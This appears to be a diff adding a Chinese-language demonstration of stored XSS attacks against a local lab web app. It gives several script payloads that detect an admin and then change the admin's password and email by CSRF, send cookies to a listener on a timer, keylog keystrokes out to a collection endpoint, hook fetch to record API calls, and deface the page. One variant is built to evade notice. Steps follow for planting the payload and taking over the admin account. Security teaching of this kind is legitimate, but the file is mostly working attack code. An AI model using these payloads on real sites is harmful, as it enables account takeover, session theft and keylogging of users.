@@ -1,0 +1,181 @@
+=== Stored XSS 攻擊演示 ===
+
+## 🎯 針對 Admin 的專門攻擊載荷
+
+### 1. 完整的 Admin 攻擊載荷
+```html
+<script>
+// 檢查當前用戶是否為 admin
+function isAdmin() {
+    const navContent = document.querySelector('.nav-content');
+    const userLinks = document.querySelectorAll('a[href*="account"], a[href*="logout"]');
+    
+    // 檢查導航欄或頁面內容是否包含 admin 相關信息
+    if (navContent && navContent.innerText.includes('admin')) return true;
+    if (document.body.innerText.includes('歡迎 admin')) return true;
+    if (document.title.includes('admin')) return true;
+    
+    return false;
+}
+
+if (isAdmin()) {
+    console.log('[ATTACK] Admin detected - Launching targeted attack');
+    
+    // === 1. CSRF 攻擊：修改 Admin 密碼 ===
+    setTimeout(() => {
+        const tokenInput = document.querySelector('input[name="csrf_token"]');
+        if (tokenInput) {
+            fetch('/account', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'csrf_token=' + tokenInput.value + '&new_password=hacked123&email=attacker@evil.com'
+            }).then(response => {
+                if (response.ok) {
+                    console.log('[ATTACK] Admin credentials changed successfully');
+                    // 發送通知到攻擊者伺服器
+                    new Image().src = 'http://127.0.0.1:8888/keylogger?admin_pwned=success';
+                }
+            }).catch(e => console.log('[ATTACK] CSRF failed:', e));
+        }
+    }, 3000);
+    
+    // === 2. JSshell 反向連接 (Admin 專用) ===
+    setInterval(function(){
+        with(document)body.appendChild(createElement("script")).src="http://127.0.0.1:4848/?admin_session=".concat(document.cookie)
+    }, 2000);
+    
+    // === 3. Admin 專屬 Keylogger ===
+    let adminKeys = '';
+    document.addEventListener('keydown', function(e) {
+        adminKeys += e.key;
+        if (adminKeys.length >= 5 || e.key === 'Enter') {
+            new Image().src = 'http://127.0.0.1:8888/keylogger?admin_keys=' + encodeURIComponent(adminKeys);
+            adminKeys = '';
+        }
+    });
+    
+    // === 4. 管理員操作監控 ===
+    const originalFetch = window.fetch;
+    window.fetch = function(...args) {
+        // 記錄 admin 的所有 API 請求
+        new Image().src = 'http://127.0.0.1:8888/keylogger?admin_api=' + encodeURIComponent(args[0]);
+        return originalFetch.apply(this, args);
+    };
+    
+    // === 5. 頁面劫持 ===
+    setTimeout(() => {
+        if (Math.random() > 0.7) { // 30% 機率劫持頁面
+            document.body.innerHTML = `
+                <div style="background: #000; color: #f00; text-align: center; padding: 50px; font-family: monospace;">
+                    <h1>🏴‍☠️ ADMIN ACCOUNT COMPROMISED 🏴‍☠️</h1>
+                    <p>Your admin credentials have been changed.</p>
+                    <p>New password: hacked123</p>
+                    <p>Contact: attacker@evil.com</p>
+                </div>
+            `;
+        }
+    }, 10000);
+    
+} else {
+    console.log('[ATTACK] Regular user detected - Basic keylogger only');
+    
+    // 普通用戶的簡單 Keylogger
+    let keys = '';
+    document.addEventListener('keydown', function(e) {
+        keys += e.key;
+        if (keys.length >= 10) {
+            new Image().src = 'http://127.0.0.1:8888/keylogger?keys=' + encodeURIComponent(keys);
+            keys = '';
+        }
+    });
+}
+</script>
+```
+
+### 2. 簡化版 Admin 攻擊載荷（用於演示）
+```html
+<script>
+if(document.body.innerText.includes('admin') || document.body.innerText.includes('管理')) {
+    // 針對 Admin 的 CSRF 攻擊
+    fetch('/account', {
+        method: 'POST', 
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'csrf_token=' + document.querySelector('input[name="csrf_token"]').value + '&new_password=hacked123'
+    });
+    alert('Admin 密碼已被修改為 hacked123！');
+}
+</script>
+```
+
+### 3. 隱蔽版攻擊載荷
+```html
+<script>
+// 更隱蔽的 Admin 檢測和攻擊
+(function() {
+    const u = document.body.innerText;
+    const isA = u.includes('admin') || u.includes('管理員') || document.title.includes('admin');
+    
+    if (isA) {
+        // 延遲攻擊，避免被發現
+        setTimeout(() => {
+            const t = document.querySelector('input[name="csrf_token"]');
+            if (t) {
+                const fd = new FormData();
+                fd.append('csrf_token', t.value);
+                fd.append('new_password', 'hacked123');
+                fd.append('email', 'pwned@hacker.com');
+                
+                fetch('/account', {method: 'POST', body: new URLSearchParams(fd)});
+            }
+        }, 5000);
+    }
+})();
+</script>
+```
+
+### 4. 測試用簡單載荷
+```html
+<script>alert('如果你是 admin，你的密碼即將被修改！');</script>
+```
+
+## 攻擊測試步驟
+
+### 步驟 1: 準備攻擊
+1. 以普通用戶 (test/testpass) 登入
+2. 在留言板貼上完整攻擊載荷
+3. 留言成功保存到資料庫
+
+### 步驟 2: Admin 觸發攻擊
+1. Admin 登出 (如果已登入)
+2. 以 admin/adminpass 重新登入
+3. 訪問留言板查看留言
+4. 攻擊自動觸發
+
+### 步驟 3: 驗證攻擊成功
+1. Admin 登出
+2. 嘗試原密碼登入: admin/adminpass ❌
+3. 使用新密碼登入: admin/hacked123 ✅
+4. 檢查攻擊者控制面板的記錄
+
+### 步驟 4: 利用獲得的權限
+1. 以 admin/hacked123 登入
+2. 訪問管理員功能
+3. 查看 /admin/users 和 /admin/comments
+4. 獲得系統完全控制權
+
+## 攻擊效果
+
+### ✅ 成功指標
+- Admin 密碼被修改為 hacked123
+- Admin 郵箱被修改為攻擊者郵箱
+- JSshell 建立對 admin 瀏覽器的控制
+- Keylogger 記錄 admin 的按鍵
+- 攻擊者獲得管理員權限
+
+### 🎯 攻擊價值
+- 權限提升：從普通用戶到管理員
+- 數據訪問：可查看所有用戶和留言
+- 系統控制：完全控制 Web 應用
+- 持久化：攻擊載荷永久保存
+
+注意：這種針對性攻擊展示了 APT (Advanced Persistent Threat) 攻擊的特點！
